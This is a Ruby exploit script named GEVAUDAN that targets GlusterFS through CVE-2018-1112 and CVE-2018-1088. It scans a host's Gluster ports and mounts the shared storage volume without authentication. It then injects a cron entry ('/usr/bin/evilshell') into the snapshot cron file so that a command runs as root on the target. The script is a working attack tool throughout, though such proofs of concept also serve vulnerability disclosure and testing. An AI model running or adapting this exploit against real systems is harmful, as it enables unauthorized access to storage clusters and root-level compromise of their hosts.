#!/usr/bin/ruby
#GEVAUDAN - This tools attempts to release Gevaudan.
#Exploit for CVE-2018-1112 and CVE-2018-1088.
#Mauro Eldritch (plaguedoktor) @ Eldritch SEC & INT

#[Gems]
require 'colorize'                                      #Gem to colorize output
require 'net/ping'                                      #Gem to make ping requests
require 'socket'                                        #Gem to make socket requests

#[Config]
$user_privileges = ENV['USER']                          #User who runs the script
$gluster_ports = [49152, 49153, 49154, 49155, 49156]    #Ports to scan
$gluster_host = ARGV[0].to_s                            #Host to scan
$gluster_binary = `which mount.glusterfs`.to_s.chomp    #Glusterfs mount binary
$gluster_volume = "gluster_shared_storage"              #Gluster remote volume
$mount_point = "/mnt/gevaudan_poc"                      #Mountpoint for remote vulnerable volume
$cron_file = "/snaps/glusterfs_snap_cron_tasks"         #Cron file to alter after exploitation

#[Main]
def main()
    #Clear screen.
    system('clear')
    
    #Welcome banner.
    puts """
         )      (\\_
        ((    _/{  \"-;
         )).-' {{ ;'`
        ( (  ;._ \\\\

        GEVAUDAN
        Gluster Environment Vulnerable AUthentication
        for Data Access & Nuke - MauroEldritch | 2018
                CVE-2018-1088 & CVE-2018-1112
    """.blue
    
    #Check if arguments were passed, or print usage instructions.
    if ARGV.length < 1             
        puts "[*] Usage: gevaudan.rb [HOST]\n[*] Example: gevaudan.rb glustercluster-prod".yellow
        exit 1
    end
    
    #Check for root privileges.
    if $user_privileges == "root"
        puts "[*] Superuser privileges granted.".green
    else
        puts "[!] Exploit must be executed as root.\n".red
        exit 1
    end
    
    #Check if Gluster tools are installed.
    if $gluster_binary.empty?
        puts "[!] Unable to locate mount binary. Try (re)installing Gluster with 'apt install glusterfs-client'.".red
        exit 1           
    else
        puts "[*] Gluster mount binary located at '#{$gluster_binary}'.".green        
    end

    #Check if host replies to ICMP Echo Request.
    host_is_up = Net::Ping::External.new($gluster_host)
    if host_is_up.ping?
        puts "[*] #{$gluster_host} replied our ICMP request.".green        
    else
        puts "[?] #{$gluster_host} doesn't reply ICMP requests.".yellow
    end
    
    #Check open ports to determine if Gluster instance is running.
    open_ports = 0
    $gluster_ports.each do | port |
        Socket.tcp("#{$gluster_host}", port, connect_timeout: 2) {
            puts "[*] Port #{port} is open.".green 
            open_ports += 1
            } rescue false
    end
    if open_ports == 0
        puts "[?] #{$gluster_host} doesn't seem to be reachable or running gluster.".yellow
    end
    
    #Create mount point folder if doesn't exist. 
    Dir.mkdir "#{$mount_point}" rescue false
    
    #Attempt to connect to Gluster.
    puts "[-] Attempting to exploit Gluster instance on #{$gluster_host}...".blue
    gluster_connect_cmd = "#{$gluster_binary} #{$gluster_host}:/#{$gluster_volume} #{$mount_point}"
    gluster_output = system(gluster_connect_cmd)
    if gluster_output == true
        puts "[*] Volume #{$gluster_host}:/#{$gluster_volume} exploited successfully. Mounted on '#{$mount_point}'.".green
        puts "\n[-] Volume content (Showing latest 10 entries only):".blue
        gluster_test_cmd = `ls -ltrh #{$mount_point} | tail -10`
        puts gluster_test_cmd.blue
    else
        puts "[!] Error running exploit. Check glusterfs-client logs at '/var/log/glusterfs/mnt-glusterfs.log' for debug info.".red
        exit 1
    end

    #Final strike, add a crontab entry 
    begin
        File.write("#{$mount_point}#{$cron_file}", "0 6 * * * /usr/bin/evilshell")
        puts "[*] Cron file '#{$mount_point}#{$cron_file}' altered successfully.\n".green
        gluster_cron_cmd = `cat #{$mount_point}#{$cron_file}`
        puts "[-] Cron file injected entry:".blue
        puts gluster_cron_cmd.blue
        puts "\n[*] This will run as root on #{$gluster_host}.".green
    rescue
        puts "[!] Unable to inject entries into '#{$mount_point}#{$cron_file}'.".red
        exit 1
    end
end

#[Call]
main()